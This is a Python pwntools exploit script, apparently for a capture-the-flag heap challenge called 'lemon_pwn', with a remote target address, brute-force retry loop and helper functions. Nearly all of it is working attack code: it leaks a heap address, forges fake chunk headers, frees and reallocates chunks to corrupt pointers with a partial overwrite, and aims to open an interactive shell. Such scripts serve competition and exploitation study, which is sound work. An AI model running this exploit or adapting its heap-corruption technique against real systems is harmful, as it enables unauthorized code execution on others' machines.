# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
context.log_level = 'debug' 
context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './lemon_pwn'
elf = ELF(binary)
libc = elf.libc
#libc = ELF('')
context.binary = binary
DEBUG = 1
if DEBUG:
    p = process(binary)
    libc = elf.libc
    #p = process(['qemu-arm', binary])
    #p = process(['qemu-aarch64','-L','',binary])
    #p = process(['qemu-aarch64','-L','',-g,'1234',binary])
else:
    host = '47.104.70.90'
    port = '34524'
    p = remote(host,port)

l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def exhaust( pwn ):
    global p
    i = 0
    while 1 :
        try:
            i+=1
            pwn()
        except:
            lg('times ======== > ',i)
            p.close()
            if (DEBUG):
                p = process(binary)
            else :
                p = remote(host,port)

def one_gadget(filename):
    log.progress('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('>>',num)

def add(idx,name,size,content):
    cmd(1)
    sla('index of your lemon: ',idx)
    sa('Now, name your lemon: ',name)
    sla('message for you lemon: ',size)
    sa('your message: ',content)

def eadd(idx,name,size = 0x600):
    cmd(1)
    sla('index of your lemon: ',idx)
    sa('Now, name your lemon: ',name)
    sla('message for you lemon: ',size)

def delete(idx):
    cmd(3)
    sla('index of your lemon : ',idx)

def show(idx):
    cmd(2)
    sla('index of your lemon : ',idx)

def edit(idx,content):
    cmd(4)
    sla('Input the index of your lemon  : ',idx)
    sa('draw and color!',content)

def attack():
    # one_gad = one_gadget(libc.path)

    '''sla('with me?','yes')
    # dbg()
    sa('lucky number: ',0x700048)
    ru('tell me you name first:')
    # dbg('close')

    se('a'*21)
    ru('is 0x')
    stack_low_addr = rint(3)
    lg('stack_low_addr',stack_low_addr)'''

    sla('with me?','g')

    fack = flat(0,0,0,0x31)

    add(0,'a'*0x10,0x28,fack)
    show(0)
    ru('eat eat eat ')
    addr = int(p.recvuntil('.')[:-1]) + 0x50
    lg('addr',addr)
    add(1,'a'*0x10 , 0x3f0 , 'b'*0x38)
    # delete(0)

    eadd(2 , 'a' * 0x10 )
    delete(2)

    add(2 , p16(addr) , 0x28,'a')
    add(2 , flat(0,0x431) , 0x40 , 'a')
    delete(1)
    delete(0)

    fake = p64( 0x100000098 ) + p16(0xb720)
    add(1 , 'a' , 0x10 , fake )

    dbg()


    p.interactive()


exhaust(attack)

'''
@File    :   lemon_pwn.py
@Time    :   2021/08/21 11:59:54
@Author  :   Niyah 
'''